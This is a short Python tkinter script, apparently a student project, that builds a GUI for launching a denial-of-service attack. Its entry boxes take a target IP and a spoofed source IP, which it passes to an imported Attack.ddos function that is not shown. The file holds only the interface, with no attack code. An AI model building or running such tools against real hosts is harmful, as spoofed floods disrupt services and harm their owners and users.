#This Graphical user interface is a GUI for the dos attack code.
#This GUI takes 2 inputs from the user which are the IP that 
#will recieve the attack and a fake IP that will bee used as an spoofed IP.
import tkinter
import Attack
# this fuction is used to launch the attack 
def BegAttck():
    TargetIP = TargetIP_var.get()
    FakeIP = FakeIP_var.get()
    Attack.ddos(TargetIP, FakeIP)

# I learned GUI programming from different sites but mainly https://www.geeksforgeeks.org/python-gui-tkinter/ and questions answered in https://stackoverflow.com
screen = tkinter.Tk()
#img = ImageTk.PhotoImage(Image.open("dos.png"))
screen.title("DOS Attack") #title of the GUI
screen.geometry("900x720") #size of the window of the GUI
screen.configure(bg="Black") #the color of the background
# we take create a window with the above specifications
window = tkinter.Frame(screen)
# we need 2 variable to store the the IP that we want to attack and the spoofed ip that would be inplemented in the GUI
TargetIP_var = tkinter.StringVar()
FakeIP_var = tkinter.StringVar()
 
# we create 2 small boxes where the user should put his inputs in
entryA = tkinter.Entry(screen, textvariable = TargetIP_var)
entryA.place(relx = 0.44, rely=0.4)

label = tkinter.Label(screen, text = "Input the targetted IP address:", fg="#0e6b0e", bg="black", font=20)
label.place(relx = 0.2, rely = 0.4)                    

entryB = tkinter.Entry(screen, textvariable = FakeIP_var)
entryB.place(relx = 0.439, rely=0.45)

label = tkinter.Label(screen, text = "Input the fake IP address:", fg="#0e6b0e", bg="black", font = 20)
label.place(relx = 0.239, rely = 0.45)                    


# we relate the fuction that will launch the attack to a button that appears on the GUI
begin = tkinter.Button(screen, text = "Begin attack", padx = 10,  fg = "black", bg = "#0e6b0e", command = BegAttck)
begin.pack(side="bottom")
screen.mainloop() # a loop so the GUI stays displayed
